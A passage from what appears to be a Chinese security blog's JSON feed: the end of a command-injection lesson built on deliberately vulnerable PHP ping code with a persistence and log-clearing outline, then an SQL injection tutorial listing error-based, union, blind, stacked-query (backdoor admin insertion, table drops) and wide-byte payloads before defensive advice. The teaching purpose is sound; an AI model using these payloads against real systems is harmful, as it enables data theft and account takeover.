class=\"hljs-string\">&#x27;&#x27;</span>, <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"High级别\"><a href=\"#High级别\" class=\"headerlink\" title=\"High级别\"></a>High级别</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// 更严格的过滤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">trim</span>(<span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>]);<br><span class=\"hljs-variable\">$substitutions</span> = <span class=\"hljs-keyword\">array</span>(<br>    <span class=\"hljs-string\">&#x27;&amp;&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;;&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;| &#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;-&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;$&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;(&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;)&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;`&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;||&#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>);<br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-title function_ invoke__\">array_keys</span>(<span class=\"hljs-variable\">$substitutions</span>), <span class=\"hljs-variable\">$substitutions</span>, <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"🎓-学习要点\"><a href=\"#🎓-学习要点\" class=\"headerlink\" title=\"🎓 学习要点\"></a>🎓 学习要点</h2><h3 id=\"关键知识点总结\"><a href=\"#关键知识点总结\" class=\"headerlink\" title=\"关键知识点总结\"></a>关键知识点总结</h3><ol>\n<li><strong>漏洞成因</strong>：缺乏输入验证和输出过滤</li>\n<li><strong>利用方法</strong>：命令连接符、特殊字符绕过</li>\n<li><strong>危害程度</strong>：服务器完全控制、数据泄露</li>\n<li><strong>防护策略</strong>：输入验证、权限控制、安全编码</li>\n</ol>\n<h3 id=\"渗透测试流程\"><a href=\"#渗透测试流程\" class=\"headerlink\" title=\"渗透测试流程\"></a>渗透测试流程</h3><ol>\n<li><strong>信息收集</strong>：确定目标和攻击面</li>\n<li><strong>漏洞发现</strong>：寻找命令执行点</li>\n<li><strong>漏洞验证</strong>：确认漏洞存在</li>\n<li><strong>漏洞利用</strong>：获取系统权限</li>\n<li><strong>权限维持</strong>：上传后门、建立持久连接</li>\n<li><strong>痕迹清理</strong>：删除日志、恢复系统状态</li>\n</ol>\n<hr>\n<h2 id=\"⚠️-免责声明\"><a href=\"#⚠️-免责声明\" class=\"headerlink\" title=\"⚠️ 免责声明\"></a>⚠️ 免责声明</h2><p>本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。</p>\n",
            "tags": [
                "Web安全",
                "渗透测试",
                "命令执行",
                "漏洞利用"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "url": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "title": "SQL注入攻击详解",
            "date_published": "2025-07-23T23:51:59.000Z",
            "content_html": "<h1 id=\"SQL注入攻击详解\"><a href=\"#SQL注入攻击详解\" class=\"headerlink\" title=\"SQL注入攻击详解\"></a>SQL注入攻击详解</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>SQL注入作为Web应用程序中最常见的安全漏洞之一，至今仍是攻击者利用的主要手段。本文将详细讲解SQL注入的各种利用方式，帮助安全研究人员和开发者深入理解这一经典漏洞。</p>\n<h2 id=\"什么是SQL注入？\"><a href=\"#什么是SQL注入？\" class=\"headerlink\" title=\"什么是SQL注入？\"></a>什么是SQL注入？</h2><p><strong>SQL注入（SQL Injection）</strong> 是一种将恶意SQL语句插入原本正常查询中的攻击方式。攻击者通过在用户输入中注入特殊的SQL代码，可以控制数据库的查询逻辑，进而读取、修改甚至执行系统命令。</p>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><p>当Web应用程序未对用户输入进行充分验证和过滤时，攻击者提交的恶意输入会被直接拼接到SQL查询语句中，导致原有的查询逻辑被改变。</p>\n<h2 id=\"SQL注入类型详解\"><a href=\"#SQL注入类型详解\" class=\"headerlink\" title=\"SQL注入类型详解\"></a>SQL注入类型详解</h2><h3 id=\"1-错误注入（Error-based-Injection）\"><a href=\"#1-错误注入（Error-based-Injection）\" class=\"headerlink\" title=\"1. 错误注入（Error-based Injection）\"></a>1. 错误注入（Error-based Injection）</h3><p><strong>攻击原理</strong>：通过注入有语法错误或运行错误的SQL语句，使数据库抛出报错信息，从错误信息中提取字段、表名、数据库版本等敏感信息。</p>\n<p><strong>核心关键字</strong>：</p>\n<ul>\n<li><code>extractvalue()</code> - XML路径提取函数</li>\n<li><code>updatexml()</code> - XML更新函数</li>\n<li><code>floor(rand(0)*2)</code> - 随机数取整函数</li>\n<li><code>group by</code> - 分组查询</li>\n</ul>\n<p><strong>经典payload示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">user</span>(), <span class=\"hljs-number\">0x7e</span>))<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> updatexml(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">database</span>(), <span class=\"hljs-number\">0x7e</span>), <span class=\"hljs-number\">1</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> concat(version(), floor(rand(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">having</span> min(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p><strong>技术细节</strong>：</p>\n<ul>\n<li><code>extractvalue()</code>函数在参数格式错误时会抛出详细的错误信息</li>\n<li><code>0x7e</code>代表波浪号<code>~</code>，用作数据分隔符便于识别</li>\n<li>通过构造特定的错误条件，可以在报错中泄露数据库敏感信息</li>\n</ul>\n<h3 id=\"2-联合查询注入（Union-based-Injection）\"><a href=\"#2-联合查询注入（Union-based-Injection）\" class=\"headerlink\" title=\"2. 联合查询注入（Union-based Injection）\"></a>2. 联合查询注入（Union-based Injection）</h3><p><strong>攻击原理</strong>：通过<code>union select</code>语句将攻击者指定的查询结果与原始查询结果合并，从而在页面上直接显示数据库中的敏感数据。</p>\n<p><strong>核心关键字</strong>：</p>\n<ul>\n<li><code>union select</code> - 联合查询</li>\n<li><code>null</code> - 空值占位符</li>\n<li><code>order by</code> - 字段排序（用于探测列数）</li>\n<li><code>from dual</code> - Oracle数据库虚拟表</li>\n</ul>\n<p><strong>探测与利用流程</strong>：</p>\n<ol>\n<li><strong>确定字段数量</strong>：</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>构造联合查询</strong>：</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-keyword\">database</span>(),version() <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>提取敏感数据</strong>：</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">table_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">tables</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">column_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-built_in\">table_name</span>=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-时间延时注入（Time-based-Injection）\"><a href=\"#3-时间延时注入（Time-based-Injection）\" class=\"headerlink\" title=\"3. 时间延时注入（Time-based Injection）\"></a>3. 时间延时注入（Time-based Injection）</h3><p><strong>攻击原理</strong>：通过执行数据库延时函数，根据HTTP响应时间判断注入条件的真假。这种方法特别适用于无页面回显的盲注场景。</p>\n<p><strong>不同数据库的延时函数</strong>：</p>\n<ul>\n<li><strong>MySQL</strong>: <code>sleep(x)</code>, <code>benchmark(count, expr)</code></li>\n<li><strong>PostgreSQL</strong>: <code>pg_sleep(x)</code></li>\n<li><strong>Oracle</strong>: <code>dbms_pipe.receive_message(&#39;&#39;,x)</code></li>\n<li><strong>SQL Server</strong>: <code>waitfor delay &#39;00:00:0x&#39;</code></li>\n</ul>\n<p><strong>典型payload</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> sleep(<span class=\"hljs-number\">5</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(substr(<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)=<span class=\"hljs-string\">&#x27;r&#x27;</span>, sleep(<span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span>, benchmark(<span class=\"hljs-number\">5000000</span>,md5(<span class=\"hljs-string\">&#x27;test&#x27;</span>)), <span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>盲注自动化技巧</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 逐位判断数据库名<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&lt;<span class=\"hljs-number\">122</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-布尔盲注（Boolean-based-Blind-Injection）\"><a href=\"#4-布尔盲注（Boolean-based-Blind-Injection）\" class=\"headerlink\" title=\"4. 布尔盲注（Boolean-based Blind Injection）\"></a>4. 布尔盲注（Boolean-based Blind Injection）</h3><p><strong>攻击原理</strong>：通过构造布尔表达式，根据页面返回内容的差异来推测数据库信息。当条件为真时页面正常显示，条件为假时页面异常或内容发生变化。</p>\n<p><strong>核心函数与技巧</strong>：</p>\n<ul>\n<li><code>substr(str, pos, len)</code> - 字符串截取</li>\n<li><code>ascii(char)</code> - 字符转ASCII码</li>\n<li><code>length(str)</code> - 字符串长度</li>\n<li><code>like</code> - 模糊匹配</li>\n</ul>\n<p><strong>实战示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 判断数据库名长度<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> length(<span class=\"hljs-keyword\">database</span>())=<span class=\"hljs-number\">8</span> <span class=\"hljs-comment\">--</span><br><br># 逐位爆破数据库名<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span> <span class=\"hljs-comment\">--  # &#x27;s&#x27;</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">101</span> <span class=\"hljs-comment\">--  # &#x27;e&#x27;</span><br><br># 使用<span class=\"hljs-keyword\">like</span>进行模糊匹配<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">like</span> <span class=\"hljs-string\">&#x27;sec%&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-堆叠查询注入（Stacked-Query-Injection）\"><a href=\"#5-堆叠查询注入（Stacked-Query-Injection）\" class=\"headerlink\" title=\"5. 堆叠查询注入（Stacked Query Injection）\"></a>5. 堆叠查询注入（Stacked Query Injection）</h3><p><strong>攻击原理</strong>：当数据库和Web应用支持在一次请求中执行多条SQL语句时，攻击者可以使用分号<code>;</code>分隔多条语句，实现更复杂的攻击操作。</p>\n<p><strong>支持情况</strong>：</p>\n<ul>\n<li><strong>MySQL</strong>: 需要使用<code>multi_query()</code>函数，默认不支持</li>\n<li><strong>SQL Server</strong>: 默认支持</li>\n<li><strong>PostgreSQL</strong>: 支持</li>\n<li><strong>Oracle</strong>: 不支持</li>\n</ul>\n<p><strong>危险操作示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> users(username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;hacker&#x27;</span>,<span class=\"hljs-string\">&#x27;123456&#x27;</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">drop</span> <span class=\"hljs-keyword\">table</span> logs <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">password</span>=<span class=\"hljs-string\">&#x27;hacked&#x27;</span> <span class=\"hljs-keyword\">where</span> id=<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">create</span> <span class=\"hljs-keyword\">user</span> hacker identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">&#x27;123456&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>高级利用</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 创建新管理员账户<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> admin_users(username,<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-keyword\">role</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;backdoor&#x27;</span>,md5(<span class=\"hljs-string\">&#x27;secret&#x27;</span>),<span class=\"hljs-string\">&#x27;admin&#x27;</span>) <span class=\"hljs-comment\">--</span><br><br># 修改现有用户权限<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">role</span>=<span class=\"hljs-string\">&#x27;admin&#x27;</span> <span class=\"hljs-keyword\">where</span> username=<span class=\"hljs-string\">&#x27;normaluser&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-宽字节注入（Wide-Byte-Injection）\"><a href=\"#6-宽字节注入（Wide-Byte-Injection）\" class=\"headerlink\" title=\"6. 宽字节注入（Wide Byte Injection）\"></a>6. 宽字节注入（Wide Byte Injection）</h3><p><strong>攻击原理</strong>：利用多字节字符集（如GBK、GB2312）的编码特性，使转义字符<code>\\</code>与注入字符组合成合法的多字节字符，从而绕过转义防护机制。</p>\n<p><strong>技术背景</strong>：</p>\n<ul>\n<li>GBK编码中，一个汉字占用2个字节</li>\n<li>某些字节组合会被解释为单个汉字字符</li>\n<li><code>%df%5c</code> 在GBK编码下会被解释为一个汉字</li>\n</ul>\n<p><strong>绕过原理</strong>：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-comment\"># 正常情况：单引号被转义</span><br>payload: admin<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">转义后: admin\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br><br><span class=\"hljs-comment\"># 宽字节绕过：</span><br>payload: admin%df<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">转义后: admin%df\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br>GBK解析: admin[汉字]<span class=\"hljs-string\">&#x27; or 1=1 --</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>实战payload</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?username=<span class=\"hljs-keyword\">admin</span>%df<span class=\"hljs-string\">&#x27; union select 1,user(),3 --</span><br><span class=\"hljs-string\">?id=1%df&#x27;</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0x7e</span>,<span class=\"hljs-keyword\">database</span>())) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"7-二次注入（Second-order-Injection）\"><a href=\"#7-二次注入（Second-order-Injection）\" class=\"headerlink\" title=\"7. 二次注入（Second-order Injection）\"></a>7. 二次注入（Second-order Injection）</h3><p><strong>攻击原理</strong>：恶意payload在第一次请求中被正常存储到数据库，但在后续的查询中被调用时触发SQL注入。这种攻击方式具有很强的隐蔽性。</p>\n<p><strong>攻击流程</strong>：</p>\n<ol>\n<li><strong>第一阶段 - 数据存储</strong>：</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-comment\"># 用户注册时提交恶意用户名</span><br>username: admin&#x27;<span class=\"hljs-comment\">--</span><br><span class=\"hljs-comment\"># 被存储到数据库中</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>第二阶段 - 触发注入</strong>：</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"># 管理后台查询该用户信息时<br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> username <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;admin&#x27;</span><span class=\"hljs-comment\">--&#x27;</span><br># 注释符导致后续条件被忽略<br></code></pre></td></tr></table></figure>\n\n<p><strong>典型应用场景</strong>：</p>\n<ul>\n<li>用户注册&#x2F;个人信息修改</li>\n<li>文章评论系统</li>\n<li>文件上传功能的文件名处理</li>\n<li>日志记录系统</li>\n</ul>\n<h2 id=\"防护措施与最佳实践\"><a href=\"#防护措施与最佳实践\" class=\"headerlink\" title=\"防护措施与最佳实践\"></a>防护措施与最佳实践</h2><h3 id=\"开发层面防护\"><a href=\"#开发层面防护\" class=\"headerlink\" title=\"开发层面防护\"></a>开发层面防护</h3><ol>\n<li><strong>使用参数化查询&#x2F;预编译语句</strong></li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-regexp\">//</span> 错误写法<br><span class=\"hljs-variable\">$sql</span> = <span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>];<br><br><span class=\"hljs-regexp\">//</span> 正确写法  <br><span class=\"hljs-variable\">$stmt</span> = <span class=\"hljs-variable\">$pdo</span>-&gt;prepare(<span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br><span class=\"hljs-variable\">$stmt</span>-&gt;execute([<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>]]);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>严格的输入验证</strong></li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// 白名单验证</span><br><span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&#x27;/^[0-9]+$/&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>])) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Invalid input&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-comment\">// 长度限制</span><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;username&#x27;</span>]) &gt; <span class=\"hljs-number\">50</span>) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Username too long&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>使用ORM框架</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># Django ORM - 自动参数化<br><span class=\"hljs-keyword\">User</span>.objects.<span class=\"hljs-keyword\">filter</span>(id=user_id)<br><br># SQLAlchemy - 安全查询<br><span class=\"hljs-keyword\">session</span>.query(<span class=\"hljs-keyword\">User</span>).<span class=\"hljs-keyword\">filter</span>(<span class=\"hljs-keyword\">User</span>.id == user_id)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"数据库层面防护\"><a href=\"#数据库层面防护\" class=\"headerlink\" title=\"数据库层面防护\"></a>数据库层面防护</h3><ol>\n<li><strong>最小权限原则</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-comment\">-- 创建专用应用账户，仅授予必要权限</span><br><span class=\"hljs-keyword\">CREATE</span> <span class=\"hljs-keyword\">USER</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span> IDENTIFIED <span 